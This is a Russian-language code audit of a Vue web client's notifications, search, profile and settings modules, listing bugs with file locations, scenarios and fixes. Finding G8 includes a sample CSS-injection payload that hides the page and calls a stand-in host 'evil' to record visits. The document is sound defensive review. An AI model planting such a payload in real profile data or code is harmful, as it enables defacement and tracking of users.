## Зона: G — notifications / search / profile & relations / report / settings / header widgets

### Находки
- **G1 · 🔴 критично · logic** — `InputSearch` глотает `onSearch`/`placeholder`/`value`/`allowClear`: Enter в поиске хедера, `@ник`-навигация и вставка Bastyon-ссылки мертвы
  - Файл: `src/components/input-search/input-search.vue:3-7,19-21`, `input-search/types.ts:7-13`, `header-search.vue:8-18,120-170`
  - Суть: обёртка объявляет `placeholder`, `value`, `allowClear`, `onSearch`, `maxLength` через `defineProps`, а в `Input.Search` пробрасывает только `$attrs`. Объявленные props из `$attrs` исключаются. `@search="onEnter"` → prop `onSearch` → не доходит.
  - Сценарий: `@alice` + Enter → ничего; плейсхолдер не показывается; крестика нет; `setQuery('')` не очищает поле. Сломано с первого коммита.
  - Фикс: `inheritAttrs: false` + `v-bind="{ ...$attrs, ...props }"`, либо убрать из `InputSearchProps` всё, кроме `enterButton`.
  - Уверенность: high (vitest-монтирование: `onSearch` 0 вызовов на Enter; контроль с прямым `Input.Search` — работает).

- **G2 · 🟠 высоко · logic** — Уведомления не приходят, пока пользователь хотя бы раз не открыл выпадашку на этом устройстве: курсор фетча каждый опрос ставится на текущий head
  - Файл: `notifications-store.ts:93-108,150-151,254-263`; `main.ts:110-113`; `header-notifications.vue:433`
  - Суть: единственный писатель `notificationsLastBlock` — `persistReadPointer()` при открытии дропдауна. Пока записи нет, каждый `init({forceRefresh})` делает `lastBlock = head` и запрашивает `getmissedinfo(address, head)` → события между опросами никогда не запрашиваются. Legacy двигает курсор с каждым опросом.
  - Сценарий: новый аккаунт/устройство → бейдж 0, тостов нет — бесконечно, пока не кликнуть колокольчик.
  - Фикс: разделить курсор фетча и read-pointer: сохранять `lastBlock` при каждом опросе.
  - Уверенность: high.

- **G3 · 🟠 высоко · logic** — Каждый 30-секундный опрос стирает in-memory snapshot'ы, а `enrichedIds` запрещает дозагрузку → превью (имя/аватар актора, текст коммента) деградируют до конца сессии
  - Файл: `notifications-store.ts:141`, `notifications-enricher.ts:42,58,62,67,182`, `notifications-types.ts:59-65`, `header-notifications.vue:436`
  - Сценарий: коммент с `user.name='alice'` → открыл (ок) → через ≤30 с опрос → актор «PXXXXXXX…» без аватара и текста до перезагрузки.
  - Фикс: копировать snapshot'ы в кэши стора; либо не пересобирать `items` из IDB на каждый опрос.
  - Уверенность: high.

- **G4 · 🟡 средне · logic** — Подсветка «новых» никогда не видна: `persistReadPointer()` вызывается синхронно при открытии, до рендера
  - Файл: `header-notifications.vue:430-438, 238-240`, `notifications-store.ts:254-263`
  - Фикс: двигать read-pointer при закрытии дропдауна.

- **G5 · 🟡 средне · ux-claim / leak** — Бейдж = все нескрытые уведомления за всё время, а не непрочитанные; IDB `notifications` и `hiddenIds` никогда не чистятся
  - Файл: `notifications-store.ts:75-80, 268-284`, `notifications-api.ts` (нет prune)
  - Сценарий: через пару месяцев бейдж «99+» постоянно, каждые 30 с тянутся тысячи записей.
  - Фикс: `unreadCount` по `nblock > readBlock`; окно 200 последних; удалять скрытые из IDB.

- **G6 · 🟠 высоко · data** — Блок-лист и подписки предыдущего аккаунта остаются после `switchAccount`/«Добавить аккаунт» (= C5)
  - Файл: `user-relations-store.ts:90-94`, `auth-store.ts:340, 463-497, 238-320`; `use-profile-relations-actions.ts:92-98`
  - Фикс: `resetUserRelations()` + `init()` в `switchAccount`/`signIn`; `initedForAddress`.

- **G8 · 🟠 высоко · security** — CSS-инъекция через обложку профиля: owner-controlled `accSet.cover`/`b.cover` интерполируется в CSS `url(...)` styled-компонента без экранирования
  - Файл: `profile-cover/styled.ts:30`, `profile-cover.vue:12-27`, `profile-page.vue:145-169`
  - Суть: `background-image: url(${props.image})` — значение из on-chain `accountSetting`. `vue3-styled-components` вставляет CSS текстовой нодой без экранирования → `)` закрывает `url(`, `}` — правило, дальше произвольный CSS. Legacy пропускал через `superXSS`.
  - Сценарий: cover = `x); } body{visibility:hidden} …{background:url(https://evil/px?ip)` → дефейс/UI-redress + утечка факта визита.
  - Фикс: не интерполировать в CSS; `:style="{ backgroundImage: url(JSON.stringify(url)) }"` после валидации `http(s)`, или `<img>`.
  - Уверенность: high/medium.

- **G9 · 🟡 средне · data** — «О себе» подменяется адресом реферера: фолбэк `profile.a || profile.r`, хотя `r` — referrer
  - Файл: `profile-sidebar.vue:253`, `edit-profile-modal.vue:168`, `user-get.ts:150-151` (ошибочный комментарий)
  - Сценарий: сайдбар показывает чужой P-адрес; при редактировании предзаполнен в «О себе» → «Сохранить» пишет его on-chain.
  - Фикс: только `a`; поправить тип.
  - Уверенность: high.

- **G10 · 🟡 средне · ux-claim (i18n)** — Тосты блокировки показывают сырые ключи `comments.blocked`/`comments.unblocked` (= H11).

- **G11 · 🟡 средне · ux-claim** — Три тумблера уведомлений ничего не делают, фильтры применяются только к тостам
  - Файл: `notification-settings-store.ts:33-44`, `notification-toasts.ts:14-37` (нет веток `win`, `transactions`, `commentScore`), `use-browser-notifications.ts:68-71`, `notifications-store.ts:70-73`
  - Фикс: единая `isAllowedBySettings` для `list`, тостов и browser-уведомлений; либо убрать мёртвые тумблеры.

- **G16 · ⚪ низко · race** — `profile-page.fetchUserProfile` без токена запроса: медленный ответ старого профиля перекрывает новый
  - Файл: `profile-page.vue:63-179,181-187,196-202`
  - Фикс: счётчик/`AbortController`.

- **G17 · ⚪ низко · ux-claim** — «Недавнее» в поиске: записи `kind:'app'` персистятся, remote-приложения регистрируются только на сессию → после перезагрузки клик открывает пустой `/app/<id>`; `focus` для постов никем не читается
  - Файл: `use-search-recent.ts:70-75`, `use-search-navigation.ts:57-70`, `apps-store.ts:229-251`, `mini-app-frame.vue:2`.

- **G18 · ⚪ низко · security (privacy)** — История поиска, кэш ник→адрес и фильтры уведомлений глобальные и переживают выход
  - Файл: `search-store-consts.ts:7`, `user-resolver.ts:21`, `notification-settings-store.ts:4`, `storage-manager.ts:82-117`.
  - Фикс: ключевать по адресу и/или чистить в `signOut`.

- **G19 · ⚪ низко · data** — `edit-profile-modal` не валидирует имя (только длина) и предзаполняет сырой URL-encoded `a`
  - Файл: `edit-profile-modal.vue:123-124,168,229-238`; `nickname-validation.ts:12`; `format-about.ts:8-15`.
  - Фикс: `validateNickname` в редакторе; декодировать `a` при предзаполнении.

- **G20 · ⚪ низко · race / leak** — `notifications-store.init()` без in-flight-guard и привязки к адресу (= A12); исключение из IDB оставляет `loading=true` навсегда
  - Файл: `notifications-store.ts:85-97,151,196-200,223`; `main.ts:112`.
  - Фикс: проверка адреса после `await`; `try/finally`; дедуп.

### Несостыковки между модулями
- **G7 · 🟠 высоко · consistency** — Два источника истины для языка (= A19/H18); плюс события `theme.changed`/`locale.changed` для mini-apps не срабатывают (`sources.ts:51-68` слушает `ui-store.theme`, который никем не пишется — `use-theme` в localStorage)
  - Файл: `i18n/index.ts:57-67`, `ui-store.ts:10-16,151-176` (дефолт `'en'` vs `DEFAULT_LOCALE='ru'`), `main.ts:90-92`, `settings-page.vue:97-100`, `header-logo.vue:96-102`, `use-locale.ts:21-23`, `mini-apps/events/sources.ts:51-68`, `use-changelog.ts:37-40`.
  - Фикс: ui-store — владелец языка; `sources.ts` подписать на `use-theme.mode`/`i18n.global.locale`.

- **G12 · 🟡 средне · consistency** — Порог «низкой оценки» расходится: `upvoteVal < 0` в дропдауне/type-map против `<= 2` в тостах и legacy
  - Файл: `header-notifications.vue:265-267,349-355`, `notification-type-map.ts:26-29` vs `notification-toasts.ts:21-24`.
  - Фикс: `LOW_RATING_MAX = 2` и `isLowRating(val)`.

- **G13 · 🟡 средне · consistency (i18n)** — Захардкоженные строки и «ru-RU»-форматтеры + три реализации относительного времени
  - Файл: `notifications-mappers.ts:163` (`Оценка: N` — в IDB и в тело уведомления), `notification-toasts.ts:83`, `dummy-data/search-data.ts:2`, `use-search-navigation.ts:99`, `profile-sidebar.vue:91, 224`; `date-formatter.ts:52,76-77`, `format-explorer.ts:59-69` — `'ru-RU'`; `formatRelativeTime` ×3 (`date-formatter.ts:18-32` ≡ `notification-formatter.ts:15-27`, `format-explorer.ts:47-57` другие пороги).
  - Фикс: ключи i18n + `locale.value`; один `formatRelativeTime`.

- **G14 · ⚪ низко · consistency** — Мёртвые дубли модуля уведомлений: `notifications-store-helpers.ts` + `-consts.ts` (только свой тест, другая форма `NotificationItem`), `use-notifications-query.ts` (не используется), `header-notifications/consts.ts:4` не используется, `notifications-store.ts:161` — `GetMissedInfoEventItem` не импортирован (TS2304).
  - Фикс: удалить; добавить импорт.

- **G15 · 🟡 средне · consistency** — Аватары в чёрном списке, списках подписчиков и превью редактора профиля не проходят `resolveImageUrl`
  - Файл: `blacklist-tab.vue:18,61-64`, `use-followers-list.ts:43-46` + `followers-list-modal.vue:22`, `edit-profile-modal.vue:17,171`, `profile-cover.vue:29-32`.
  - Фикс: везде `extractAvatarFromProfile`/`resolveImageUrl`.
  - Уверенность: medium.

### Проверено — ОК
- `classifyNotificationLink`: открытый редирект закрыт; `bastyon-input-link`: только внутренние маршруты, хосты — белый список.
- Поиск: stale-ответы исключены (TanStack ключи); `sanitizeSearchQuery` 1:1 с legacy.
- `user-relations-store`: оптимистичные block/unblock/subscribe с откатом; payload как legacy.
- `complain-action`: формат как legacy; двойной submit закрыт.
- `profile-update-action`/`user-info-action`: serialize/export как legacy; `b` переносится.
- `use-private-key-reveal`: очищается при размонтировании; не логируется.
- `security-section`/`use-vault-security`: атомарная перезапись envelope с verify и откатом.
- `diagnostics-tab`: без секретов. `app-permissions-tab`: `te()` перед `t()`.
- `header-events` + `pending-post-preview-modal`: `pendingCount` ≡ элементы; отписка в `onBeforeUnmount`; ключи есть.
- `header-report-bug`: чат с `bastyon_nextgen_supp`, без автоотправки данных.
- `header-tor`: синхронизация со стором корректна.
- `profile-badges`: логика совпадает с 5 другими местами.
- Per-account keying уведомлений в IDB корректен (`initedForAddress`).
- `search-page` пагинация без дублей/дыр.
